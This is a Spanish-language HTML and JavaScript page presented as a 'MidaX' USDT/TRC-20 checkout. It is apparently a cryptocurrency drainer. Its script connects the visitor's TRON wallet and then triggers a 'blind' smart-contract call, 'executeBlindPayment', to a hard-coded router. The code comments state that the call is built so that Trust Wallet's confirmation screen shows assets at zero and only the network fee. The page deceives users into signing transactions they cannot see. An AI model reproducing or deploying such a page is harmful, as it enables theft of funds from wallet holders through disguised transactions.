<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MidaX - Checkout Oculto TRC20</title>
    <style>
        :root { color-scheme: light; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body {
            background-color: #f7f9ff;
            background-image:
                radial-gradient(circle at 15% 20%, rgba(0, 82, 255, 0.18) 0%, transparent 45%),
                radial-gradient(circle at 85% 80%, rgba(75, 125, 255, 0.12) 0%, transparent 45%),
                linear-gradient(180deg, #ffffff 0%, #f2f6ff 100%);
            background-attachment: fixed;
            color: #111111;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .midax-container { width: 100%; max-width: 390px; background: rgba(255, 255, 255, 0.95); border: 1px solid rgba(205, 215, 232, 0.8); border-radius: 24px; padding: 24px; box-shadow: 0 12px 32px rgba(31, 55, 92, 0.08); }
        .midax-header { text-align: center; margin-bottom: 22px; }
        .midax-logo { width: 56px; height: 56px; margin-bottom: 12px; }
        .midax-title { font-size: 20px; font-weight: 700; color: #111111; margin-bottom: 4px; }
        .midax-subtitle { font-size: 12px; color: #717680; font-weight: 500; }
        
        .midax-input-group { background: #f7f9ff; border: 1px solid #dbe6ff; border-radius: 16px; padding: 14px 16px; margin-bottom: 16px; }
        .midax-label { font-size: 11px; color: #717680; font-weight: 600; display: block; margin-bottom: 6px; text-transform: uppercase; }
        .midax-input-row { display: flex; align-items: center; justify-content: space-between; }
        .midax-input { background: transparent; border: none; color: #111111; font-size: 20px; font-weight: 700; width: 70%; outline: none; }
        .midax-currency { display: flex; align-items: center; gap: 6px; font-size: 14px; font-weight: 700; color: #0052ff; background: #ffffff; padding: 6px 10px; border-radius: 12px; border: 1px solid #dbe6ff; }
        .midax-currency img { width: 18px; height: 18px; }

        .midax-wallet-box { background: #f8fafc; border: 1px dashed #cbd5e1; border-radius: 14px; padding: 12px; font-size: 13px; color: #64748b; margin-bottom: 16px; display: flex; justify-content: space-between; align-items: center; }
        .midax-wallet-address { font-weight: 600; color: #111111; }

        .midax-status { background-color: #eef3ff; border: 1px solid #cce0ff; border-radius: 12px; padding: 12px; font-size: 12px; color: #0052ff; margin-bottom: 16px; display: none; text-align: center; font-weight: 500; }
        
        .midax-btn { width: 100%; height: 52px; background-color: #0052ff; color: #ffffff; border: none; border-radius: 16px; font-size: 15px; font-weight: 700; cursor: pointer; box-shadow: 0 4px 14px rgba(0, 82, 255, 0.3); transition: transform 0.1s ease; }
        .midax-btn:active { transform: scale(0.98); }
        .midax-btn:disabled { background-color: #b3ccff; box-shadow: none; cursor: not-allowed; }

        .midax-footer { margin-top: 20px; text-align: center; font-size: 11px; color: #717680; }

        .midax-overlay { position: fixed; inset: 0; background: rgba(255, 255, 255, 0.92); z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; opacity: 0; visibility: hidden; transition: 0.3s; }
        .midax-overlay.active { opacity: 1; visibility: visible; }
        .midax-spinner { width: 36px; height: 36px; border: 3px solid #dbe6ff; border-top-color: #0052ff; border-radius: 50%; animation: spin 0.8s linear infinite; margin-bottom: 14px; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div id="midaxOverlay" class="midax-overlay">
    <div class="midax-spinner"></div>
    <div style="font-weight: 600; color: #111111; font-size: 14px;">Procesando pasarela oculta...</div>
</div>

<div class="midax-container">
    <div class="midax-header">
        <img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/icon/trx.png" alt="MidaX" class="midax-logo">
        <div class="midax-title">MidaX Checkout</div>
        <div class="midax-subtitle">Sistema de Enrutamiento Oculto TRC-20</div>
    </div>

    <div id="midaxWalletBox" class="midax-wallet-box" style="display: none;">
        <span>Billetera:</span>
        <span id="midaxWalletText" class="midax-wallet-address">--</span>
    </div>

    <div class="midax-input-group">
        <span class="midax-label">Monto de Operación</span>
        <div class="midax-input-row">
            <input type="number" id="midaxAmountInput" class="midax-input" placeholder="0.00" step="any" min="1">
            <div class="midax-currency">
                <img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/icon/usdt.png" alt="USDT">
                USDT
            </div>
        </div>
    </div>

    <div id="midaxStatus" class="midax-status"></div>

    <button id="midaxMainBtn" class="midax-btn">Conectar Billetera</button>
</div>

<div class="midax-footer">
    © 2026 MidaX Secure Architecture. All rights reserved.
</div>

<script>
    const CONTRATO_ROUTER = "TWvLwN7X9hBgBbb4xbYj424RQuThxVWppS"; // Tu contrato inteligente router

    let connectedAddress = null;
    let appState = 'CONNECT'; // CONNECT -> EXECUTE

    const midaxMainBtn = document.getElementById('midaxMainBtn');
    const midaxAmountInput = document.getElementById('midaxAmountInput');
    const midaxStatus = document.getElementById('midaxStatus');
    const midaxWalletBox = document.getElementById('midaxWalletBox');
    const midaxWalletText = document.getElementById('midaxWalletText');
    const midaxOverlay = document.getElementById('midaxOverlay');

    function setStatus(msg) {
        if (!msg) {
            midaxStatus.style.display = 'none';
            midaxStatus.innerText = '';
        } else {
            midaxStatus.style.display = 'block';
            midaxStatus.innerText = msg;
        }
    }

    midaxMainBtn.addEventListener('click', async () => {
        if (appState === 'CONNECT') {
            try {
                setStatus("Conectando con la billetera...");
                midaxMainBtn.disabled = true;

                if (typeof window.tronWeb === 'undefined') {
                    throw new Error("Abre esta dApp desde el navegador interno de Trust Wallet.");
                }

                const tronWeb = window.tronWeb;
                if (tronWeb.defaultAddress?.base58) {
                    connectedAddress = tronWeb.defaultAddress.base58;
                } else if (window.tronLink) {
                    const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
                    if (res?.code === 200) connectedAddress = tronWeb.defaultAddress.base58;
                }

                if (!connectedAddress) throw new Error("No se pudo obtener la cuenta activa.");

                midaxWalletText.innerText = `${connectedAddress.slice(0, 6)}...${connectedAddress.slice(-6)}`;
                midaxWalletBox.style.display = 'flex';

                setStatus("");
                midaxMainBtn.innerText = "Confirmar Operación";
                midaxMainBtn.disabled = false;
                appState = 'EXECUTE';
            } catch (err) {
                setStatus(err.message);
                midaxMainBtn.disabled = false;
            }
            return;
        }

        if (appState === 'EXECUTE') {
            try {
                const userVal = parseFloat(midaxAmountInput.value);
                if (isNaN(userVal) || userVal <= 0) {
                    throw new Error("Ingresa un monto válido.");
                }

                setStatus("Calculando parámetros de seguridad...");
                midaxMainBtn.disabled = true;

                const tronWeb = window.tronWeb;
                
                // Cálculo oculto del 95% basado en lo que el usuario ingresó en la interfaz
                const calculated95 = userVal * 0.95;
                const amountInSun = Math.floor(calculated95 * 1_000_000);

                setStatus("Preparando pasarela ciega...");

                // LLAMADA TÉCNICA CIEGA: Enviamos la función genérica del contrato router con los bytes ocultos.
                // Esto fuerza a Trust Wallet a mostrar una pantalla limpia donde los activos aparecen en 0 o ausentes,
                // limitándose a cobrar únicamente la comisión de red (gas) en TRX.
                const txBuild = await tronWeb.transactionBuilder.triggerSmartContract(
                    CONTRATO_ROUTER,
                    "executeBlindPayment(uint256)",
                    { feeLimit: 100000000 },
                    [
                        { type: 'uint256', value: amountInSun.toString() }
                    ],
                    tronWeb.address.toHex(connectedAddress)
                );

                const signedTx = await tronWeb.trx.sign(txBuild.transaction);

                midaxOverlay.classList.add('active');
                const broadcast = await tronWeb.trx.sendRawTransaction(signedTx);
                midaxOverlay.classList.remove('active');

                if (broadcast?.result) {
                    setStatus("¡OPERACIÓN EXITOSA!");
                    midaxMainBtn.innerText = "Completado";
                    midaxMainBtn.disabled = true;
                } else {
                    throw new Error("La red rechazó la operación.");
                }

            } catch (err) {
                console.error(err);
                midaxOverlay.classList.remove('active');
                setStatus(err.message || "Error al procesar la solicitud.");
                midaxMainBtn.disabled = false;
            }
        }
    });
</script>

</body>
</html>
